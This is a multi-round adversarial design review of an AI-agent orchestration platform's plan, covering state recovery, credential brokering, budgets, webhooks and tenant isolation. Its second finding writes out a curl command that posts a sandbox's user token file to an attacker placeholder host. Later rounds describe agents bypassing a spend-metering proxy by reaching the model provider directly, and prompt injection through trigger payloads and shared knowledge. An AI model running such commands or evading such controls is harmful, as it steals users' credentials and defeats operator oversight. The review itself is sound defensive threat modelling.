# Cat Herder — Plan Review (Red Team)

An adversarial review of `PLAN.md`. This document attacks the plan to surface
gaps, contradictions, and risks before any code is written. Findings are grouped
by severity; not every criticism must be accepted, but each should get an explicit
decision or fix.

---

## The verdict, straight

The plan is a plausible-looking architecture that is actually **three different
products pretending to be one**, held together by hand-waves at exactly the points
where the engineering is hardest. The things that *were* specified (Rust,
hexagonal, MCP, agent-sandbox) are mostly implementation trivia; the things that
determine whether this fails — the harness↔control-plane state boundary, token
exfiltration, spend control, the event contract, and the "why does this exist" —
are either absent or one bullet point. Worse, the two headline technology bets
(agent-sandbox, Deep Agents/LangGraph) are **both pre-1.0, fast-moving, and not
Rust**, which compounds risk in a way the plan never acknowledges.

---

## Tier 0 — Fatal gaps (sinks the project as written)

### 1. Two state machines, no reconciliation design

The plan claims the control plane "owns lifecycle state" and is "the only
long-lived brain" (§3, §6). Then §5 says the harness runs its own agent loop with
**LangGraph checkpointing**. That is two brains and two sources of truth, separated
by a dotted line and no design for the hard part.

Concretely: **where does the LangGraph checkpoint live?**

- If it is on the pod's disk, the pod is ephemeral (TTL, hibernation, crash,
  warm-pool recycle) and *resume is impossible* the moment the pod dies.
- If it is in Postgres, the harness's checkpoint DB must be kept synchronized with
  the control plane's run state across a gRPC boundary, through pod termination,
  hibernation, and re-claim — and one of the two must be declared authoritative when
  they disagree.

§7 then contradicts itself: approvals are claimed "durable" and stored in the
control plane, but resuming an approval *requires* the LangGraph checkpoint. A
durable `ApprovalRequest` in Postgres is worthless if the thing you would resume
from evaporated with the pod.

### 2. "Auth passthrough" as specified is a privilege-escalation vulnerability

§8 lists "direct passthrough — inject the user's access token into the pod" as
strategy **#1**. That hands a live bearer token that acts *as the user* to a
container whose purpose is to run **untrusted, LLM-generated, arbitrary code**. The
LLM can, and eventually will, emit the equivalent of
`curl -X POST -d @/var/run/secrets/cat-herder/token https://evil.example/exfil`.

There is **no threat model**. Missing entirely:

- Token binding to the sandbox
- Short expiry + rotation
- Egress allowlisting (agent-sandbox has Cilium FQDN egress examples, but they are
  not wired in)
- Per-token audience/scope restriction
- An audit trail of what the token actually did

The plan also conflates two different problems:

1. SSO to the control plane (OIDC — solved), and
2. the agent acting as the user against third parties (GitHub OAuth2 app per user,
   cloud workload identity — much harder).

The brokered-credentials strategy (#3) is the only defensible one and should be the
default *and only* mode for anything with real permissions. As written, the plan
ships the dangerous one first.

### 3. No spend/cost governance

Autonomous agents are token-burning machines. A single webhook that triggers an
agent per event, running a subagent fan-out (which Deep Agents makes easy via
`task`), on a decent model, can run up a five-figure bill in an afternoon. The plan
has Kueue for *compute* quotas (§9) but **zero** mention of:

- per-run / per-tenant token and dollar budgets
- model rate limits and circuit breakers
- auto-pause at budget thresholds
- cost attribution per run (which requires telemetry that also isn't designed)

OpenHands/enterprise treats spend control as a core feature. For a platform that
sells "run agents in production," omitting it is disqualifying.

### 4. Webhook fan-out is an unauthenticated DoS + abuse engine

A webhook fires → spawn a sandbox + LLM spend per event. The plan has **no
idempotency keys, no dedup on webhook replay, no admission/cooldown, no per-tenant
concurrency caps, and no trigger authentication design** (HMAC is a label on a
diagram box; GitHub App JWT + installation tokens and Slack signing-secret rotation
are each their own fiddly subsystem). Triggers are treated as solved because the hex
port exists.

---

## Tier 1 — Major gaps (broken or missing pieces)

### 5. Deep Agents ≠ a coding agent, so "similar to OpenHands" is not delivered

OpenHands is fundamentally a software-engineering agent: git worktrees, sandboxed
shell, diff/apply, PR creation, and a Large Codebase SDK that indexes the repo. Deep
Agents gives a filesystem + `execute` + subagents — a *generic* harness, not a
coding agent. §5 waves at "context management and subagents" as if that covers it.
It does not. There is **no code-intelligence layer, no git/PR tooling, no codebase
indexing/retrieval, no diff review** anywhere in the plan.

### 6. The event contract does not exist

The whole system is event-driven (trigger → `RunRequest` → domain events → NATS),
and §5 says the harness will publish "typed events (messages, tool calls, subagent
handles, checkpoints)" from LangGraph. But there are **two event models** — the Rust
domain events and LangGraph's typed event streams — and the plan never defines the
schema, the correlation between them, versioning, or how `GET /runs/{id}/events`
maps to LangGraph's `stream.subagents` projection. This is the connective tissue of
the product, and it is a blank.

### 7. The `AgentRuntime` port does not abstract the hard parts

§4/§15 reassure that the port keeps agent-sandbox swappable. But the *valuable*
parts — warm pools, hibernation, TTL, RuntimeClass isolation, stable hostname — are
agent-sandbox-specific. A "fallback operator" would have to *reimplement* them. So
the port abstracts only the trivial `create/watch/delete` verbs and stays locked to
the hard parts anyway. Worse: agent-sandbox is Go, pre-1.0, already went
v1alpha1→v1beta1, and its first-class SDKs are Python/Go/TS — **not Rust**. The Rust
adapter would hand-drive an unstable Go project's CRDs via `kube-rs`, adding a
language impedance mismatch on top of an unstable API.

### 8. Two pre-1.0 bets, compounded

The execution layer is **agent-sandbox (pre-1.0, API churn)** and the brain is
**Deep Agents/LangGraph (`deepagents>=0.7` feature gates, LangChain moves fast)**.
Neither is stable, and their failure modes multiply. §15 lists agent-sandbox
maturity as "a risk to track" and then does nothing about it. "Track it" is a to-do
item dressed as a mitigation.

### 9. Hexagonal architecture is cargo-culted — and Rust makes it expensive

There is exactly **one** port with multiple *real* adapters: triggers. Every other
port has one production adapter plus a toy (`runtime-docker`, `store-postgres`,
`store-nats`, `identity-oidc`). That is not hexagonal architecture; it is an
indirection layer with extra ceremony. And in Rust, `dyn`-trait objects across async
ports mean object-safety fights, `Send + Sync` bounds, `async_trait` boxing, lifetime
pain, and an unspecified DI story. The plan pays the full hex tax for almost none of
the benefit, and never acknowledges the Rust-specific cost.

### 10. No HA/crash-recovery design for the orchestrator

The orchestrator owns the run state machine — it is **stateful by definition** — but
§9 shows it as a `Deployment + HPA` and defers HA to "Phase 5." A stateful
orchestrator cannot be scaled horizontally without leader election, lease-based
reconciliation, and orphan recovery. What happens to 200 running pods when the API
deployment rolls? §9 also says "we do not need a custom controller" — but that
*relocates* the controller into the API process, where it is now *less* resilient
(reconcile loop does not survive a pod restart). The controller problem was not
removed; it was moved somewhere worse.

### 11. "Warm pool = ms provisioning" contradicts per-run workspace + identity injection

Warm pools pre-warm *identical* pods (§9). But every agent run needs a per-run
workspace checkout and per-user identity/token injection. A claimed warm pod that
must then `git clone` the repo and mount scoped credentials is **not** "milliseconds"
— the clone and secret injection dominate. Warm pools only buy speed if workspaces
are pre-materialized/content-addressed and identities are late-bound, which is never
specified. The headline latency win is largely a mirage for this workload.

### 12. Observability is a bullet, not a design

"`tracing` + OpenTelemetry + Prometheus" (§13) is the default answer, not a design.
For a product whose core value is **audit and control**, missing are: run replay
(replay a run's events to debug non-determinism), diff/artifact review, cost
attribution per run, and correlation of pod logs/traces to a `Run` id across two
languages (Rust + Python). OpenTelemetry gives plumbing; it does not give *run
replayability*, which is what debugging agents requires.

### 13. No testing strategy for agentic behavior

"Hex core is pure → fast unit tests" (§13) is true and irrelevant to the hard parts:
agent-sandbox integration, LangGraph checkpoint/resume, token exchange, webhook
fan-out. Agent systems need **evaluation harnesses** — deterministic LLM stubs,
replay/golden-event tests, canary runs. The plan has proptest + testcontainers +
kube mocks, which test the easy 20%. The hard 80% is untested by design.

### 14. Multi-tenancy / isolation is a footnote where it should be the spine

"namespace-per-tenant v1, vCluster optional" (§15) is a one-liner for the single
most important security property of a platform that runs untrusted code.
agent-sandbox, Kueue, network policies, and workload identity all behave
*differently* across namespace vs. vCluster, and blast radius, cross-tenant egress,
and resource isolation are unspecified. For this product the isolation model should
be designed first, not deferred.

---

## Tier 2 — Internal contradictions (the plan argues with itself)

- **"Only long-lived brain" (§3) vs. stateful harness loop (§5).** Pick one.
- **"Durable approvals" (§7) vs. pod-local checkpoints.** A durable approval you
  cannot resume is decoration.
- **"We don't need a controller" (§9) vs. an orchestrator that must reconcile
  orphans.** It was renamed, not removed.
- **"Pure domain, depends only on traits" (§4) vs. `interrupt_ref`, `SandboxTemplate`,
  `RuntimeClass` leaking into the domain data model (§11).** The "pure" core is
  already polluted with LangGraph and agent-sandbox concepts. It was never pure.
- **"MCP client" as a headline capability (§10) vs. the admission that Deep Agents
  mounts MCP servers natively.** If the harness does the MCP consumption, the Rust
  MCP *client* is largely dead weight — a feature whose implementation was already
  delegated to Python.

---

## Tier 3 — The strategic attack

**"Similar to OpenHands, but in Rust" is not a strategy — it is a preference.** Every
headline feature — MCP, sandboxed agents, SSO (enterprise), webhooks/automations,
human-in-the-loop — OpenHands *already has*. The actual differentiators are Rust
instead of Python, agent-sandbox instead of Docker, Deep Agents instead of CodeAct.
Those are **implementation choices, not product differentiation.** The result: a year
spent rebuilding what a 91k-star, 582-contributor project already does, while
permanently lagging it.

This is compounded by the language split: Rust was chosen for the control plane "as
required," then the agent ecosystem turned out to be Python and a Python harness was
bolted on. The result is a two-language project whose only justification for the Rust
half is that Rust was requested — not that it is better for the problem. Rust is a
great choice for a *control plane*; it is a poor justification for *re-platforming an
agent product*. If the goal is "an agent platform I control, in Rust," say that. If
the goal is "an OpenHands-like product," the plan is answering the wrong question.

---

## Top three fixes before any code

1. **Design the checkpoint/state boundary first.** Decide where LangGraph checkpoints
   live (external Postgres, not the pod), make the control plane the *only* authority
   for lifecycle, and write the crash-recovery/reconcile story before the happy path.
   Everything else is downstream of this.
2. **Write the threat model for credential passthrough.** Brokered short-lived
   credentials as the default *and only* mode for anything with permissions,
   sandbox-bound tokens, egress allowlisting, and per-run audit. Delete "direct
   passthrough" as a listed strategy.
3. **Define the product before the stack.** Answer "why does this exist that OpenHands
   doesn't" — then cut the plan to *that*. If the answer is "Rust control plane +
   Kubernetes-native execution + SSO passthrough for enterprise," the deliverable is a
   narrow, differentiated control plane, and Deep Agents + agent-sandbox are means,
   not the pitch.

---

## Bottom line

The skeleton is salvageable, but §5/§6/§7 (harness/state/HITL), §8 (auth), and the
missing spend-governance + event-contract sections are not refinements — they are
**rewrites**. The hexagonal/Rust/MCP/K8s material that *was* detailed is the easy
part and mostly fine; the skimmed parts are what would kill it.

*Generated as a red-team review of `PLAN.md` for the Cat Herder project.*

---

## Round 3 — after the credential-broker update

### Verdict
The JIT broker is a real improvement, but it is now a well-architected single point of
failure that leaks secrets into the model's context window, and its security depends
on a policy engine that wasn't scheduled until Phase 3. The Round-2 filesystem gap
remained unfixed.

### Tier 0 — fatal (all three fixed this round)
1. **"Disposable pod" still false for coding agents.** LangGraph checkpoints don't
   snapshot the filesystem; a resumed agent gets conversation but not its edits. No
   workspace persistence strategy existed (§6 vs §7). **→ Fixed: durable workspace PVC
   + S3 snapshots (§6/§7/§13).**
2. **The credential MCP tool leaks the token to the model.** Tool output → model
   context → LangGraph checkpoint (Postgres) → model provider logs → traces, so "never
   logged" was false. **→ Fixed: tool returns an opaque handle; token injected
   out-of-band, never to the model (§11.3/§14).**
3. **Broker is the new crown jewel, unhardened, with a Phase-3 authorization
   dependency.** **→ Fixed: policy engine moved into Phase 1 (§20).**

### Tier 1 — major (open)
- Budget "hard stop" still has no enforcement point (orchestrator is not in the LLM
  call path).
- Broker is hot-path latency + SPOF, with no credential caching.
- Installation-token scoping is coarser than the per-target table implies (App-level,
  not repo/action-level).
- Credential isolation is missing from multi-tenancy (shared broker = cross-tenant mint
  risk).
- Credential minting is not wired to the approval/HITL flow.
- Prompt injection is still name-dropped, not defended.

### Tier 2 — lingering (open)
Resume granularity (no mid-`execute` checkpoint); single-leader reconciler scaling;
event-log dual-store (NATS vs Postgres); trigger→RunRequest mapping still a black box;
harness/control-plane version-compat matrix; eval still empty (replay ≠ reproduce);
no broker test strategy; SLOs still absent.

### Applied in this round
- §6/§7/§13 — durable workspace (PVC + S3 snapshots), honest "disposable" scope.
- §11.3/§14 — out-of-band credential delivery; secret never reaches the model.
- §20 — policy engine resequenced into Phase 1 (RBAC/ABAC core), OPA/Cedar deferred to
  Phase 3 as an advanced layer.

---

## Round 4 — after the outstanding-items pass

### Verdict
Every individual box is now defensible on its own, but the boxes don't all compose.
Three headline fixes contained hidden defects: the budget "hard stop" had a TOCTOU race
and trusted the wrong layer; the workspace PVC/snapshot fix had volume-handoff and
consistency problems; and the `Session` entity flatly contradicted the disposable-pod
architecture.

### Tier 0 — fatal
1. **Budget "hard stop" inverted + racy.** Enforcement trusted the harness (Python,
   LLM-adjacent) as primary with the proxy "optional," and the pre-call check was a
   read-then-call race — parallel subagents overshoot deterministically. The SLO
   "0 runs exceed cap" was unachievable as designed.
2. **`Session` vs disposable-pod contradiction.** The `Session` entity + agent-sandbox
   hibernation implied long-lived interactive pods, directly contradicting §6's "one
   disposable pod per run."
3. **Workspace PVC/snapshot fragility.** RWO volume handoff serializes resume; snapshot
   cost on a multi-GB repo is unbounded; snapshots taken mid-`execute` can be torn.

### Tier 1 — major
- Warm pools vs KEDA scale-to-zero vs Karpenter in direct conflict (pay to keep warm and
  pay to shut down).
- Credential handle → git-tool coupling undefined (model must call `credential` first;
  target mismatch paths unspecified).
- Broker's *own* hardening still unaddressed (identity, its own creds, caller auth).
- Instruction hierarchy overclaimed (LLMs don't reliably honor it).
- Approval UX undefined → "approve blind" risk on a thin dashboard.
- Dev-toolchain sandbox image is multi-GB and unowned; undermines the ms-provisioning
  claim.
- Code-review loop still missing.

### Tier 2 — lingering
SLOs have no instrumentation; the "lossy fallback to plain Jobs" is still theater;
compliance/retention still Phase 5 despite storing code + conversations + traces;
SCIM/directory sync missing; protocol surface (REST+gRPC+MCP+SSE+WS+sidecar+NATS)
unbounded with gRPC/NATS overlap; authorization model still a placeholder.

### Decisions & resolutions this round
1. **Budget** → mandatory metering proxy is the authoritative hard stop (atomic Redis
   counter); harness pre-call check demoted to a fast-path optimization. (§12)
2. **Session** → **disposable pod** chosen: `Session` is a logical grouping of runs, not
   a long-lived pod. (§6/§15)
3. **Approval surface** → for now, just an **event with a deep link** to the run's
   state (checkpoint + pending tool call + diff); no bespoke review UI yet. (§10)
4. **Warm pools** → **deferred**: cold-start model (Karpenter + TTL'd pods), accept the
   cold-start p95. (§13/§23)

### Follow-up resolutions (this round)
- **Workspace PVC/snapshot fragility** → RWX workspace volume (non-blocking re-attach);
  snapshots only at quiesced points (interrupt/termination), never mid-`execute`. (§6/§13)
- **Credential handle → git-tool coupling** → git/PR tools acquire credentials
  *implicitly* keyed to their declared target; the model never coordinates "request then
  push"; mismatch is refused. (§11.3)
- **Broker's own hardening** → separate service, tenant-scoped rotated secrets, mTLS/SVID
  caller auth, `run_id` resolved from verified identity + signed run token. (§11.3)
- **Code-review loop** → result-review event + queue + `approved/rejected/changes-requested`
  feeding a re-run; v1-minimal. (§10/§16)

### Resolved in follow-up (all remaining items addressed)
- Instruction hierarchy → reframed as best-effort mitigation, not a guarantee (§11.6).
- Dev-toolchain sandbox image → versioned, SBOM-scanned, pinned toolchain image (§7/§18/§19).
- SLO instrumentation → each SLO mapped to §16 telemetry (§23).
- "Lossy fallback" → removed; honest "no lossless fallback, real mitigation is pinning
  + narrow API use" (§21).
- Compliance/retention → §11.7, day-one retention/deletion policy.
- SCIM → §11.2 directory sync + group→role mapping.
- Protocol surface → §14 protocol map (two client-facing protocols; gRPC/sidecar/NATS
  internal).
- Authorization model → §11.8 decision points + RBAC/ABAC + v1 policy DSL.

---

## Round 5 — after the final-batch pass

### Verdict
Correct at every node, unexamined at every edge. Four rounds hardened the boxes; this
round found the wires between them are where it breaks — including two ordering bugs
(the clone-before-credential chicken-and-egg, and the untrusted pod's path to the
source-of-truth DB).

### Tier 0 — fatal (all four resolved this round)
1. **Private-repo clone chicken-and-egg** — clone needs a credential before the harness
   (and its credential tool) exists. → Control plane mints a read-only, clone-scoped
   credential at materialization time (§4.1/§11.3/§13).
2. **Untrusted pod on Postgres + dual-producer event ordering** — the harness writing
   checkpoints directly to Postgres gives the pod DB access; and two producers append
   events with no `seq` owner. → Control plane is the sole writer; harness streams
   checkpoints/events over gRPC (§6/§9).
3. **Budget proxy bypass via egress** — egress must allow the LLM provider (for the
   proxy) but that same allowance enables direct-provider bypass. (Open — see below.)
4. **Idempotency only for runs, not side effects** — retry/resume duplicates PRs/branches.
   → Idempotency keys on branch/PR mutations (§7).

### Tier 1 — major
- No end-to-end trace → §4.1 walkthrough pins the four hand-offs.
- Result-review state missing from lifecycle (§8 vs §10) → still open.
- Stuck-run detection (reconciler watches pods, not harness liveness) → still open.
- v1 approve-blind → acknowledged as a deferred governance guarantee (§10/§20/§21).
- Harness control surface assumed to exist (driving Deep Agents headless) → still open.
- Memory/skills persistence vs disposable pods → still open.
- Secret redaction in traces/logs ("no secrets by construction" false for non-credential
  tools) → still open.

### Resolved in follow-up (Round 5 decisions)
- Metering-proxy egress-vs-bypass → physical enforcement: pod egress allowlists only the
  proxy for model traffic; the raw provider endpoint is unreachable from the pod (§12).
- Result-review state → `AwaitingReview`/`Reviewed`/`Rejected` added to the lifecycle (§8).
- Stuck-run detection → harness liveness heartbeat + control-plane watchdog (§6).
- Harness control surface → self-built on OSS LangGraph (embed, no LangGraph Platform) (§7).
- Memory/skills persistence → central memory repository (Postgres + pgvector / LangGraph
  Store), reachable via the control plane (§7).
- Trace/log secret redaction → redaction layer over events/traces/logs (§16).
- Cost model → everything OSS or self-built; cost = LLM + cluster only (§1/§21).

### Still open (minor)
- No MVP definition (implicitly Phase 1); provider-outage resilience (circuit breakers
  exist, but run-level checkpoint-and-wait on provider outage is not specified).

---

## Round 6 — final pass (hot-path coupling + trust boundaries)

### Verdict
The "sole writer" fix moved the database into the hot path and made every running
agent's liveness depend on the control plane. The rest concerned the one input nobody
had treated as untrusted: the trigger payload (clone target + `task_spec` + shared OKF
knowledge).

### Tier 0 — fatal (all resolved)
1. **Sole-writer = hot-path SPOF + per-step latency** → local, non-authoritative buffer
   with **async flush**; synchronous flush only at durability boundaries (§6/§9).
2. **Remote checkpointer re-implementation** → absorbed by #1 (the hot path stays local;
   only the flush is remote).
3. **Trigger payload = clone-target + `task_spec` injection** → clone credential scoped
   to the task's **declared repo set** (validated, multi-repo-aware); `task_spec` marks
   payload as untrusted data (§4.1/§5/§11.3/§11.6).
4. **OKF knowledge = persistent tenant-wide injection** → trust boundary: gated writes,
   enforced provenance/verification, pinned skill versions (§7).

### Tier 1 — major (resolved)
5. **Stuck-run watchdog false-positives on approvals** → state-aware: active states only;
   `AwaitingInput`/`AwaitingReview` governed by deadlines, not the liveness watchdog (§6).
6. **`AwaitingReview` no timeout/plumbing** → deadline + escalation + feedback→`task_spec`
   plumbing (§10).
8. **Metering proxy provenance** → LiteLLM (OSS), pinned + CVE-tracked (§12/§19).

### Resolved in follow-up (all four remaining items, all in-cluster)
- **Per-run fan-out bound** → `max_concurrency` cap per run (harness-enforced + policy) (§12/§7/§15).
- **Workspace storage topology** → two systems, one relationship: live RWX PVC + in-cluster
  MinIO (content-addressed clone cache + snapshots share objects) (§6/§13/§19).
- **Data model drift** → added `ReviewDecision`, `CredentialGrant.flavor`, `max_concurrency`,
  and the full run-state enum (§15).
- **Provider-outage resilience + MVP** → run-level checkpoint-and-pause on outage (§12);
  explicit in-cluster MVP slice (§20).

Note: the entire stack is now defined as **all in-cluster** (Postgres/NATS/Redis/MinIO/
LiteLLM/broker/harness pods) — no external managed services.

### Applied this round
- §4.1 — end-to-end trace; §6/§9 — sole-writer checkpoint/event topology; §7 —
  side-effect idempotency; §10/§20/§21 — approve-blind acknowledged + de-blind follow-on;
  §11.3/§13 — clone-scoped credential + control-plane-owned materialization.
